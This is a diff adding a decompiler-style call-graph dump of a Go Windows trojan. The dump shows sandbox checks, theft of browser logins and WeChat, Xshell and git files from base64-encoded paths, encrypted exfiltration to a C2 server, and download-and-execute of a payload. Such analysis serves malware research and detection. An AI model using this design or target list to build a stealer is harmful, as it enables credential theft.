@@ -1,0 +1,594 @@
+main.main
+  0x5117e0 -> main.(*Win32_DiskDriveInfo).GetDiskDrivesInfo
+  0x511837 -> log.Printf("Error retrieving disk drive information: 1 %v\n")
+  0x511879 -> main.(*Win32_DiskDriveInfo).getBiosInfo
+  0x5118a0 -> main.initCookie
+  0x511900 -> log.Printf("Error retrieving disk drive information: 2 %v\n")
+  0x511931 -> fmt.Fprintf("Error retrieving disk drive information")
+  0x511940 -> os.Exit
+  0x511946 -> torjanPrefix/pkg.GetRAM
+  0x511954 -> torjanPrefix/pkg.GetRAM
+  0x51199a -> log.Printf("Failed the RAM Checking ,RAM GB: %v\n ")
+  0x5119a4 -> os.Exit
+  0x5119a9 -> main.initWSock2
+  0x511b65 -> fmt.Fprintln
+  0x511be5 -> fmt.Fprintln
+  0x511c65 -> fmt.Fprintln
+  0x511c78 -> torjanPrefix/pkg.CollectSensitiveFileAndSend
+  0x511c87 -> time.Sleep
+  0x511ca0 -> os.MkdirTemp("temp")
+  0x511d00 -> path/filepath.Join
+  0x511d82 -> log.Println
+  0x511da6 -> strings.IndexAny("ie")
+  0x511e0c -> torjanPrefix/pkg.DownloadRemote
+  0x511e20 -> torjanPrefix/pkg.ExecuteTargetProcess
+  0x511e6c -> log.Println
+main.(*Win32_DiskDriveInfo).GetDiskDrivesInfo
+  0x511178 -> github.com/StackExchange/wmi.Query("SELECT Caption, DeviceID, FirmwareRevision, InterfaceType, Model, PNPDeviceID, SerialNumber FROM Win32_DiskDrive")
+  0x5111c3 -> log.Printf("Error retrieving disk drive information: %v\n")
+github.com/StackExchange/wmi.Query
+  0x50d294 -> github.com/StackExchange/wmi.(*SWbemServices).Query
+  0x50d2c0 -> github.com/StackExchange/wmi.(*Client).Query
+github.com/StackExchange/wmi.(*SWbemServices).Query
+  0x50cf69 -> sync.(*Mutex).lockSlow
+  0x50cfd6 -> sync.(*Mutex).unlockSlow
+  0x50cfee -> fmt.Errorf("SWbemServices has been closed")
+  0x50d137 -> sync.(*Mutex).unlockSlow
+  0x50d1a0 -> sync.(*Mutex).unlockSlow
+  0x50d1b8 -> fmt.Errorf("SWbemServices is not Initialized")
+github.com/StackExchange/wmi.(*Client).Query
+  0x50dad2 -> reflect.Value.Elem
+  0x50daef -> github.com/StackExchange/wmi.checkMultiArg
+  0x50db35 -> sync.(*Mutex).lockSlow
+  0x50dbd1 -> github.com/StackExchange/wmi.(*Client).coinitService
+  0x50dc7a -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x50dd00 -> github.com/StackExchange/wmi.oleInt64
+  0x50dd35 -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x50ddb6 -> github.com/go-ole/go-ole.(*IUnknown).IEnumVARIANT
+  0x50de4e -> reflect.Value.typeSlow
+  0x50de5a -> reflect.MakeSlice
+  0x50de8f -> reflect.Value.Set
+  0x50deaa -> github.com/go-ole/go-ole.(*IEnumVARIANT).Next
+  0x50df40 -> fmt.Errorf("can't get IEnumVARIANT, enum is nil")
+  0x50e192 -> github.com/go-ole/go-ole.(*IEnumVARIANT).Next
+  0x50e247 -> github.com/StackExchange/wmi.(*Client).Query.func1
+github.com/StackExchange/wmi.checkMultiArg
+  0x510c05 -> reflect.Value.typeSlow
+  0x510c14 -> indirect_call
+  0x510c2a -> indirect_call
+  0x510c60 -> indirect_call
+  0x510c76 -> indirect_call
+github.com/StackExchange/wmi.(*Client).coinitService
+  0x50d486 -> github.com/go-ole/go-ole.coInitializeEx
+  0x50d4f2 -> indirect_call -> github.com/StackExchange/wmi.(*Client).coinitService.func2
+  0x50d524 -> github.com/go-ole/go-ole/oleutil.CreateObject("WbemScripting.SWbemLocator")
+  0x50d580 -> github.com/go-ole/go-ole.queryInterface
+  0x50d5f5 -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x50d665 -> indirect_call
+  0x50d6b7 -> indirect_call
+  0x50d709 -> indirect_call
+  0x50d769 -> indirect_call
+  0x50d7bb -> indirect_call
+github.com/go-ole/go-ole.coInitializeEx
+  0x505b44 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/StackExchange/wmi.(*Client).coinitService.func2
+  0x50d888 -> indirect_call
+github.com/go-ole/go-ole/oleutil.CreateObject
+  0x50ce79 -> github.com/go-ole/go-ole.ClassIDFrom
+  0x50ce8c -> github.com/go-ole/go-ole.CreateInstance
+github.com/go-ole/go-ole.ClassIDFrom
+  0x50a520 -> github.com/go-ole/go-ole.CLSIDFromProgID
+  0x50a534 -> github.com/go-ole/go-ole.CLSIDFromString
+github.com/go-ole/go-ole.CLSIDFromProgID
+  0x505be0 -> syscall.StringToUTF16Ptr
+  0x505c2b -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.CLSIDFromString
+  0x505ce0 -> syscall.StringToUTF16Ptr
+  0x505d2b -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.CreateInstance
+  0x505e46 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.queryInterface
+  0x508fac -> syscall.Syscall
+github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x506ef6 -> github.com/go-ole/go-ole.(*IDispatch).GetSingleIDOfName
+  0x506f22 -> github.com/go-ole/go-ole.invoke
+  0x506f40 -> github.com/go-ole/go-ole.invoke
+github.com/go-ole/go-ole.(*IDispatch).GetSingleIDOfName
+  0x506e36 -> github.com/go-ole/go-ole.getIDsOfName
+github.com/go-ole/go-ole.getIDsOfName
+  0x507043 -> syscall.StringToUTF16Ptr
+  0x5070d6 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x50711a -> syscall.Syscall6
+github.com/go-ole/go-ole.invoke
+  0x507345 -> github.com/go-ole/go-ole.VariantInit
+  0x507429 -> github.com/go-ole/go-ole.SysAllocStringLen
+  0x507acc -> time.Time.Format
+  0x507ad1 -> github.com/go-ole/go-ole.SysAllocStringLen
+  0x507b40 -> github.com/go-ole/go-ole.safeArrayFromByteSlice
+  0x507cc8 -> time.Time.Format
+  0x5082e0 -> github.com/go-ole/go-ole.safeArrayFromStringSlice
+  0x5085ca -> github.com/go-ole/go-ole.VariantInit
+  0x508637 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x5086a1 -> syscall.Syscall9
+  0x5086c0 -> github.com/go-ole/go-ole.BstrToString
+  0x508869 -> github.com/go-ole/go-ole.SysFreeString
+  0x5088ac -> github.com/go-ole/go-ole.LpOleStrToString
+github.com/go-ole/go-ole.VariantInit
+  0x505f02 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.SysAllocStringLen
+  0x50605a -> unicode/utf16.Encode
+  0x5060aa -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayFromByteSlice
+  0x50a340 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x50a371 -> github.com/go-ole/go-ole.safeArrayPutElement
+github.com/go-ole/go-ole.safeArrayPutElement
+  0x5098b4 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayFromStringSlice
+  0x50a440 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x50a48f -> github.com/go-ole/go-ole.SysAllocStringLen
+  0x50a4a1 -> github.com/go-ole/go-ole.safeArrayPutElement
+github.com/go-ole/go-ole.BstrToString
+  0x50a691 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x50a6e0 -> unicode/utf16.Decode
+github.com/go-ole/go-ole.SysFreeString
+  0x506142 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.LpOleStrToString
+  0x50a602 -> unicode/utf16.Decode
+github.com/StackExchange/wmi.oleInt64
+  0x510d2e -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x510da1 -> indirect_call -> github.com/StackExchange/wmi.oleInt64.func1
+github.com/StackExchange/wmi.oleInt64.func1
+  0x510e41 -> github.com/go-ole/go-ole.(*VARIANT).Clear
+github.com/go-ole/go-ole.(*VARIANT).Clear
+  0x50a734 -> github.com/go-ole/go-ole.VariantClear
+github.com/go-ole/go-ole.VariantClear
+  0x505fa2 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.(*IUnknown).IEnumVARIANT
+  0x508bd3 -> github.com/go-ole/go-ole.reflectQueryInterface
+github.com/go-ole/go-ole.reflectQueryInterface
+  0x508d60 -> reflect.Value.Elem
+  0x508e20 -> reflect.Value.Elem
+  0x508e60 -> reflect.Value.Addr
+  0x508e65 -> reflect.Value.Pointer
+  0x508e81 -> syscall.Syscall
+github.com/go-ole/go-ole.(*IEnumVARIANT).Next
+  0x508b0a -> syscall.Syscall6
+github.com/StackExchange/wmi.(*Client).Query.func1
+  0x50e419 -> reflect.New
+  0x50e432 -> reflect.valueInterface
+  0x50e447 -> github.com/StackExchange/wmi.(*Client).loadEntity
+  0x50e4d0 -> indirect_call -> github.com/StackExchange/wmi.(*Client).Query.func1.1
+  0x50e51a -> reflect.Value.Elem
+  0x50e56f -> reflect.Append
+  0x50e599 -> reflect.Value.Set
+  0x50e5b4 -> indirect_call
+github.com/StackExchange/wmi.(*Client).loadEntity
+  0x50ea00 -> reflect.Value.Elem
+  0x50ea50 -> reflect.Value.NumField
+  0x50ea81 -> reflect.Value.Field
+  0x50eac9 -> reflect.Value.typeSlow
+  0x50ead8 -> indirect_call
+  0x50eada -> reflect.New
+  0x50eb00 -> reflect.Value.Set
+  0x50eb20 -> reflect.Value.Elem
+  0x50eba3 -> reflect.Value.typeSlow
+  0x50ebbd -> indirect_call
+  0x50ec67 -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x50ecc0 -> reflect.Value.typeSlow
+  0x50edf3 -> github.com/go-ole/go-ole.(*VARIANT).Value
+  0x50ee8e -> strconv.ParseUint
+  0x50eeb7 -> reflect.Value.SetUint
+  0x50eed5 -> strconv.ParseInt
+  0x50ef04 -> reflect.Value.SetInt
+  0x50ef66 -> reflect.Value.typeSlow
+  0x50efea -> strconv.Atoi
+  0x50f0a4 -> fmt.Sprintf("%02d%02d")
+  0x50f100 -> time.parse("20060102150405.000000-0700")
+  0x50f1f9 -> reflect.Value.Set
+  0x50f21a -> reflect.Value.SetString
+  0x50f321 -> reflect.Value.SetFloat
+  0x50f440 -> reflect.Value.SetBool
+  0x50f5ab -> reflect.Value.SetUint
+  0x50f5c8 -> reflect.Value.SetInt
+  0x50f76f -> reflect.Value.SetUint
+  0x50f78c -> reflect.Value.SetInt
+  0x50f8ac -> reflect.Value.typeSlow
+  0x50f8b1 -> reflect.Zero
+  0x50f8d7 -> reflect.Value.Set
+  0x50f922 -> reflect.Value.typeSlow
+  0x50f934 -> indirect_call -> github.com/StackExchange/wmi.(*Client).loadEntity.func1
+  0x50f940 -> indirect_call
+  0x50f99a -> github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray
+  0x50f9e0 -> reflect.Value.typeSlow
+  0x50fa00 -> reflect.MakeSlice
+  0x50fa94 -> github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray
+  0x50fad8 -> reflect.Value.typeSlow
+  0x50faf7 -> reflect.MakeSlice
+  0x50fb89 -> github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray
+  0x50fbcd -> reflect.Value.typeSlow
+  0x50fbec -> reflect.MakeSlice
+  0x50fc46 -> reflect.Value.Set
+  0x50fd72 -> reflect.Value.typeSlow
+  0x50fe80 -> reflect.Value.typeSlow
+  0x50ff8f -> reflect.Value.typeSlow
+  0x5100a0 -> reflect.Value.typeSlow
+  0x5101af -> reflect.Value.typeSlow
+  0x51020c -> fmt.Sprintf("unsupported type (%T)")
+  0x510339 -> reflect.Value.typeSlow
+  0x510393 -> fmt.Sprintf("unsupported slice type (%T)")
+  0x5104e7 -> reflect.Value.typeSlow
+  0x510640 -> reflect.Value.Index
+  0x510668 -> reflect.Value.SetString
+  0x5106d9 -> reflect.Value.Set
+  0x510736 -> reflect.Value.Index
+  0x510830 -> reflect.Value.SetUint
+  0x5108c8 -> reflect.Value.Set
+  0x510923 -> reflect.Value.Index
+  0x510a1a -> reflect.Value.SetInt
+github.com/go-ole/go-ole.(*VARIANT).Value
+  0x50a82e -> github.com/go-ole/go-ole.GetVariantDate
+  0x50a8c0 -> github.com/go-ole/go-ole.BstrToString
+github.com/go-ole/go-ole.GetVariantDate
+  0x50ab05 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x50ab46 -> time.Date
+  0x50ab59 -> time.Now
+github.com/StackExchange/wmi.(*Client).loadEntity.func1
+  0x510b81 -> github.com/go-ole/go-ole.(*VARIANT).Clear
+github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray
+  0x509950 -> github.com/go-ole/go-ole.(*SafeArrayConversion).TotalElements
+  0x509983 -> github.com/go-ole/go-ole.safeArrayGetVartype
+  0x5099f4 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509a85 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509b14 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509baf -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509c4a -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509ce5 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509d80 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509d8a -> github.com/go-ole/go-ole.(*VARIANT).Value
+  0x509e11 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509ea7 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509f40 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x509fcf -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x50a062 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x50a0ef -> github.com/go-ole/go-ole.safeArrayGetElement
+github.com/go-ole/go-ole.(*SafeArrayConversion).TotalElements
+  0x50a26e -> github.com/go-ole/go-ole.safeArrayGetLBound
+  0x50a288 -> github.com/go-ole/go-ole.safeArrayGetUBound
+github.com/go-ole/go-ole.safeArrayGetLBound
+  0x5095c0 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayGetUBound
+  0x5096c0 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayGetVartype
+  0x5097af -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayGetElement
+  0x5094cc -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/StackExchange/wmi.(*Client).Query.func1.1
+  0x50e681 -> github.com/go-ole/go-ole.(*IUnknown).Release
+github.com/go-ole/go-ole.(*IUnknown).Release
+  0x508c52 -> syscall.Syscall
+main.(*Win32_DiskDriveInfo).getBiosInfo
+  0x511253 -> github.com/StackExchange/wmi.Query("SELECT SerialNumber FROM Win32_BIOS")
+  0x5112a6 -> log.Printf("Failed to execute WMI query: %v\n")
+main.initCookie
+  0x51140d -> strings.Replace("\n")
+  0x51142a -> strings.Replace("\r")
+  0x511464 -> strings.Replace("\n")
+  0x511481 -> strings.Replace("\r")
+  0x5114d8 -> crypto/md5.Sum
+  0x511539 -> log.Println
+torjanPrefix/pkg.GetRAM
+  0x4f5d8d -> syscall.(*LazyProc).Find
+  0x4f5dc2 -> syscall.Syscall6
+main.initWSock2
+  0x5116e0 -> syscall.WSAStartup
+  0x5116ef -> os.Exit
+  0x5116f4 -> torjanPrefix/pkg.ResolveAndConnect
+  0x511728 -> log.Println
+torjanPrefix/pkg.ResolveAndConnect
+  0x4f98f8 -> torjanPrefix/pkg.parseCustomDomainName
+  0x4f990a -> net.LookupIP
+  0x4f9962 -> log.Printf("Failed to resolve domain: %s\n")
+torjanPrefix/pkg.parseCustomDomainName
+  0x4f966f -> internal/bytealg.IndexByte
+  0x4f96d2 -> strings.genSplit(":")
+  0x4f9715 -> strconv.FormatInt
+  0x4f9760 -> log.Println("Invalid CustomDomainName format 2")
+  0x4f9826 -> fmt.Fscanf("%d")
+  0x4f98a5 -> log.Println
+torjanPrefix/pkg.CollectSensitiveFileAndSend
+  0x4f7bd9 -> torjanPrefix/pkg.getEnv
+  0x4f7beb -> torjanPrefix/pkg.collectCodepage
+  0x4f7c31 -> fmt.Sprintf("%d")
+  0x4f7c43 -> torjanPrefix/pkg.getAllCryptStr
+  0x4f7ca5 -> torjanPrefix/pkg.GetFileContent
+  0x4f7d06 -> log.Println("Failed to collect browser accounts:")
+  0x4f7d40 -> log.Println
+  0x4f7e00 -> log.Println
+  0x4f7e60 -> torjanPrefix/pkg.getFileName
+  0x4f7ec0 -> log.Println("Failed to collect browser accounts:")
+  0x4f7f23 -> log.Println
+  0x4f7f91 -> torjanPrefix/pkg.getFileName("wxid")
+  0x4f7ff1 -> log.Println("Failed to collect browser accounts:")
+  0x4f8015 -> strings.Join
+  0x4f802f -> strings.genSplit("||||")
+  0x4f8090 -> log.Println
+  0x4f810a -> torjanPrefix/pkg.collectPhoneNumber
+  0x4f8179 -> torjanPrefix/pkg.GetFileContent
+  0x4f81e2 -> log.Println
+  0x4f8257 -> torjanPrefix/pkg.GetFileContent
+  0x4f8266 -> os.tempDir
+  0x4f8281 -> torjanPrefix/pkg.GetRandFileName
+  0x4f832c -> torjanPrefix/pkg.CopyFile2Target
+  0x4f838c -> log.Println("Failed to copy file:")
+  0x4f83b9 -> torjanPrefix/pkg.collectBrowserAccounts
+  0x4f8421 -> log.Println("Failed to collect browser accounts:")
+  0x4f848c -> log.Println
+  0x4f85ab -> torjanPrefix/pkg.collectFireFoxBrowserAccounts
+  0x4f8613 -> log.Println("Failed to collect browser accounts:")
+  0x4f8760 -> torjanPrefix/pkg.collectFireFoxBrowserAccounts
+  0x4f87c8 -> log.Println("Failed to collect browser accounts:")
+  0x4f87cd -> torjanPrefix/pkg.GetRandFileName
+  0x4f8880 -> torjanPrefix/pkg.CopyFile2Target
+  0x4f88b2 -> torjanPrefix/pkg.collectBrowserAccounts
+  0x4f891a -> log.Println("Failed to collect browser accounts:")
+  0x4f892f -> torjanPrefix/pkg.GetRandFileName
+  0x4f89e0 -> torjanPrefix/pkg.CopyFile2Target
+  0x4f8a12 -> torjanPrefix/pkg.GetFileContent
+  0x4f8a80 -> log.Println("Failed to collect browser accounts:")
+  0x4f8af1 -> log.Println
+  0x4f8b99 -> log.Println
+  0x4f8c21 -> torjanPrefix/pkg.normalSock
+  0x4f8cac -> log.Println
+  0x4f8d0b -> torjanPrefix/pkg.normalSock
+  0x4f8d82 -> torjanPrefix/pkg.sendFileToServer
+  0x4f8e13 -> log.Println
+  0x4f8e72 -> torjanPrefix/pkg.sendFileToServer
+  0x4f8efa -> log.Println
+  0x4f8f59 -> torjanPrefix/pkg.sendFileToServer
+  0x4f8fcd -> torjanPrefix/pkg.sendFileToServer
+  0x4f9039 -> torjanPrefix/pkg.sendFileToServer
+  0x4f90a9 -> torjanPrefix/pkg.sendFileToServer
+  0x4f9140 -> log.Println
+  0x4f91a2 -> torjanPrefix/pkg.normalSock
+torjanPrefix/pkg.getEnv
+  0x4f65c0 -> os.Getenv("USERPROFILE")
+  0x4f6600 -> log.Println
+torjanPrefix/pkg.collectCodepage
+  0x4f70a4 -> syscall.LoadDLL("kernel32.dll")
+  0x4f70ef -> log.Println
+  0x4f710d -> syscall.(*DLL).FindProc
+  0x4f7158 -> log.Println
+  0x4f7170 -> syscall.(*Proc).Call
+torjanPrefix/pkg.getAllCryptStr
+  0x4f7344 -> torjanPrefix/pkg.base64Decode("XC5hZ2dyZXNzb3IucHJvcA==")
+  0x4f73b2 -> torjanPrefix/pkg.base64Decode("XERvY3VtZW50c1xUZW5jZW50IEZpbGVzXCo=")
+  0x4f7456 -> torjanPrefix/pkg.base64Decode("XERvY3VtZW50c1xXZUNoYXQgRmlsZXNcKg==")
+  0x4f7500 -> torjanPrefix/pkg.base64Decode("XERvY3VtZW50c1xXZUNoYXQgRmlsZXNc")
+  0x4f75a6 -> torjanPrefix/pkg.base64Decode("XERvY3VtZW50c1xOZXRTYXJhbmcgQ29tcHV0ZXJcN1xYc2hlbGxcU2Vzc2lvbnNcKi54c2g=")
+  0x4f7651 -> torjanPrefix/pkg.base64Decode("XERvY3VtZW50c1xOZXRTYXJhbmcgQ29tcHV0ZXJcN1xYc2hlbGxcU2Vzc2lvbnNc")
+  0x4f76f6 -> torjanPrefix/pkg.base64Decode("XC5naXRDb25maWc=")
+  0x4f77a0 -> torjanPrefix/pkg.base64Decode("XEFwcERhdGFcTG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRh")
+  0x4f7846 -> torjanPrefix/pkg.base64Decode("XEFwcERhdGFcUm9hbWluZ1xNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXM=")
+  0x4f78f1 -> torjanPrefix/pkg.base64Decode("bG9naW5zLmpzb24=")
+  0x4f7996 -> torjanPrefix/pkg.base64Decode("a2V5NC5kYg==")
+  0x4f7a40 -> torjanPrefix/pkg.base64Decode("XEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==")
+  0x4f7ae6 -> torjanPrefix/pkg.base64Decode("XEFwcERhdGFcUm9hbWluZ1xUZW5jZW50XFFRTXVzaWNcUVFNdXNpY1NlcnZpY2VDb25maWcuaW5p")
+torjanPrefix/pkg.base64Decode
+  <no direct calls>
+torjanPrefix/pkg.GetFileContent
+  0x4f62f6 -> os.OpenFile
+  0x4f6337 -> os.(*File).Stat
+  0x4f635a -> indirect_call -> torjanPrefix/pkg.GetFileContent.func1
+  0x4f6388 -> os.(*File).Read
+  0x4f63a4 -> indirect_call
+  0x4f6409 -> indirect_call
+  0x4f644d -> indirect_call
+  0x4f6491 -> indirect_call
+torjanPrefix/pkg.GetFileContent.func1
+  0x4f6561 -> os.(*File).Close
+torjanPrefix/pkg.getFileName
+  0x4f68d6 -> strings.Replace("*")
+  0x4f68e0 -> io/ioutil.ReadDir
+  0x4f69e3 -> log.Println("files :")
+  0x4f69f6 -> indirect_call
+  0x4f6a2a -> indirect_call
+  0x4f6a40 -> strings.Index
+  0x4f6a79 -> indirect_call
+torjanPrefix/pkg.collectPhoneNumber
+  0x4f6c96 -> path/filepath.Join
+  0x4f6cb4 -> torjanPrefix/pkg.getFileName("AccInfo.dat")
+  0x4f6da2 -> path/filepath.Join
+  0x4f6da7 -> torjanPrefix/pkg.GetFileContent
+torjanPrefix/pkg.GetRandFileName
+  0x4f71e7 -> math/rand.(*Rand).Read
+  0x4f7233 -> fmt.Sprintf("%x")
+torjanPrefix/pkg.CopyFile2Target
+  0x4f7284 -> os.ReadFile
+  0x4f72a7 -> os.WriteFile
+torjanPrefix/pkg.collectBrowserAccounts
+  0x4f6f05 -> log.Println
+  0x4f6f14 -> torjanPrefix/pkg.GetFileContent
+torjanPrefix/pkg.collectFireFoxBrowserAccounts
+  0x4f6f85 -> torjanPrefix/pkg.traverseDir
+  0x4f6fe5 -> log.Println
+  0x4f700f -> torjanPrefix/pkg.GetFileContent
+torjanPrefix/pkg.traverseDir
+  0x4f66a5 -> path/filepath.Walk -> torjanPrefix/pkg.traverseDir.func1
+torjanPrefix/pkg.traverseDir.func1
+  0x4f6793 -> indirect_call
+  0x4f67a7 -> indirect_call
+torjanPrefix/pkg.normalSock
+  0x4faf6f -> torjanPrefix/pkg.createSocket
+  0x4faff2 -> log.Printf("%v %v\n")
+  0x4fb065 -> log.Println("conn err:")
+  0x4fb0cf -> torjanPrefix/pkg.connectIPPool
+  0x4fb0e7 -> time.Now
+  0x4fb152 -> math/rand.(*Rand).Seed
+  0x4fb16a -> indirect_call -> torjanPrefix/pkg.normalSock.func1
+  0x4fb1c0 -> indirect_call
+  0x4fb1d7 -> indirect_call
+  0x4fb211 -> torjanPrefix/pkg.sendCryptMsg
+  0x4fb240 -> torjanPrefix/pkg.sendCryptMsg
+  0x4fb255 -> indirect_call
+  0x4fb293 -> log.Println
+  0x4fb2a8 -> indirect_call
+torjanPrefix/pkg.createSocket
+  0x4f93c7 -> torjanPrefix/pkg.parseIPPort
+  0x4f9465 -> net.IP.String
+  0x4f94d5 -> fmt.Sprintf("%s:%d")
+  0x4f94ec -> net.Dial("tcp")
+  0x4f9559 -> fmt.Fprintln
+torjanPrefix/pkg.parseIPPort
+  0x4f9ab9 -> fmt.Errorf("Invalid IP port bytes")
+torjanPrefix/pkg.connectIPPool
+  0x4f9b95 -> time.Now
+  0x4f9ba4 -> time.Time.Add
+  0x4f9bc0 -> indirect_call
+  0x4f9c00 -> log.Println
+torjanPrefix/pkg.normalSock.func1
+  0x4fb369 -> indirect_call
+torjanPrefix/pkg.sendCryptMsg
+  0x4fa3ef -> torjanPrefix/pkg.customCrypt
+  0x4fa420 -> torjanPrefix/pkg.sendPackMsg
+torjanPrefix/pkg.customCrypt
+  0x4f5fcd -> torjanPrefix/pkg.getRandKey
+torjanPrefix/pkg.getRandKey
+  0x4f5ee0 -> torjanPrefix/pkg.getRandKey
+  0x4f5f09 -> math/rand.(*Rand).Intn
+  0x4f5f25 -> math/rand.(*Rand).Intn
+torjanPrefix/pkg.sendPackMsg
+  0x4fa242 -> torjanPrefix/pkg.packMsg
+  0x4fa2ab -> fmt.Fprintln
+  0x4fa2f5 -> torjanPrefix/pkg.sendMsg
+torjanPrefix/pkg.packMsg
+  0x4f9ce0 -> bytes.(*Buffer).Write
+  0x4f9d0f -> bytes.(*Buffer).Write
+  0x4f9d49 -> encoding/binary.Write
+  0x4f9dc5 -> fmt.Fprintf("packMsg header 28 : %02X\n")
+  0x4f9de7 -> bytes.(*Buffer).Write
+torjanPrefix/pkg.sendMsg
+  0x4fa012 -> fmt.Fprintln
+  0x4fa090 -> indirect_call
+torjanPrefix/pkg.sendFileToServer
+  0x4faa16 -> torjanPrefix/pkg.createSocket
+  0x4faa65 -> torjanPrefix/pkg.connectIPPool
+  0x4faa80 -> time.Now
+  0x4faae7 -> math/rand.(*Rand).Seed
+  0x4fab00 -> indirect_call -> torjanPrefix/pkg.sendFileToServer.func1
+  0x4fab56 -> indirect_call
+  0x4faba5 -> torjanPrefix/pkg.sendCryptMsg
+  0x4fabc7 -> torjanPrefix/pkg.sendCryptMsg
+  0x4fac3a -> log.Println
+  0x4fac95 -> torjanPrefix/pkg.sendCryptMsg
+  0x4facac -> indirect_call
+  0x4facce -> indirect_call
+  0x4fad0b -> torjanPrefix/pkg.sendCryptMsg
+  0x4fad20 -> indirect_call
+  0x4fadc0 -> torjanPrefix/pkg.sendCryptMsg
+  0x4fadcf -> torjanPrefix/pkg.recvMsg
+  0x4faded -> indirect_call
+torjanPrefix/pkg.sendFileToServer.func1
+  0x4faec9 -> indirect_call
+torjanPrefix/pkg.recvMsg
+  0x4fa154 -> indirect_call
+torjanPrefix/pkg.DownloadRemote
+  0x4fb402 -> torjanPrefix/pkg.createSocket
+  0x4fb449 -> torjanPrefix/pkg.connectIPPool
+  0x4fb461 -> time.Now
+  0x4fb4c7 -> math/rand.(*Rand).Seed
+  0x4fb4e0 -> indirect_call -> torjanPrefix/pkg.DownloadRemote.func1
+  0x4fb536 -> indirect_call
+  0x4fb56d -> torjanPrefix/pkg.sendCryptMsg
+  0x4fb58c -> torjanPrefix/pkg.sendCryptMsg
+  0x4fb5a3 -> indirect_call
+  0x4fb5c5 -> indirect_call
+  0x4fb601 -> torjanPrefix/pkg.readNetFile
+  0x4fb61b -> indirect_call
+torjanPrefix/pkg.DownloadRemote.func1
+  0x4fb6c9 -> indirect_call
+torjanPrefix/pkg.readNetFile
+  0x4fa4ee -> os.OpenFile
+  0x4fa536 -> time.Now
+  0x4fa545 -> time.Time.Add
+  0x4fa564 -> indirect_call -> torjanPrefix/pkg.readNetFile.func1
+  0x4fa5a3 -> indirect_call
+  0x4fa5e7 -> time.Now
+  0x4fa5f6 -> time.Time.Add
+  0x4fa615 -> indirect_call
+  0x4fa652 -> io.ReadAtLeast
+  0x4fa682 -> torjanPrefix/pkg.parseMsg
+  0x4fa6c6 -> os.(*File).Write
+  0x4fa6f3 -> torjanPrefix/pkg.sendCryptMsg
+  0x4fa76d -> indirect_call
+  0x4fa7a9 -> indirect_call
+  0x4fa7e5 -> indirect_call
+  0x4fa835 -> indirect_call
+  0x4fa871 -> indirect_call
+torjanPrefix/pkg.readNetFile.func1
+  0x4fa961 -> os.(*File).Close
+torjanPrefix/pkg.parseMsg
+  0x4f9f08 -> fmt.Errorf("invalid message buffer length")
+torjanPrefix/pkg.ExecuteTargetProcess
+  0x4fb78c -> syscall.StringToUTF16Ptr
+  0x4fb7b4 -> syscall.CreateProcess
+  0x4fb80b -> log.Println
+  0x4fb85a -> indirect_call -> torjanPrefix/pkg.ExecuteTargetProcess.func1
+torjanPrefix/pkg.ExecuteTargetProcess.func1
+  0x4fb8c0 -> syscall.CloseHandle
+  0x4fb8ce -> syscall.CloseHandle
+
+Semantic analysis
+  assessment_hints:
+    - Reachable code references suspicious high-entropy or magic-containing data blobs.
+    - Reachable functions contain byte transformation loops that may decode strings, configs, or payloads at runtime.
+    - The binary contains behavior consistent with dynamic code allocation and execution.
+  mid_function_control_transfers:
+    - github.com/StackExchange/wmi.(*Client).loadEntity:0x50ebea call -> runtime.duffcopy+0x32c classification=go_runtime_duff_helper
+    - main.initWSock2:0x5116ca call -> runtime.duffzero+0xdd classification=go_runtime_duff_helper
+    - main.main:0x5119ca call -> runtime.duffzero+0x150 classification=go_runtime_duff_helper
+    - main.main:0x5119ea call -> runtime.duffzero+0x150 classification=go_runtime_duff_helper
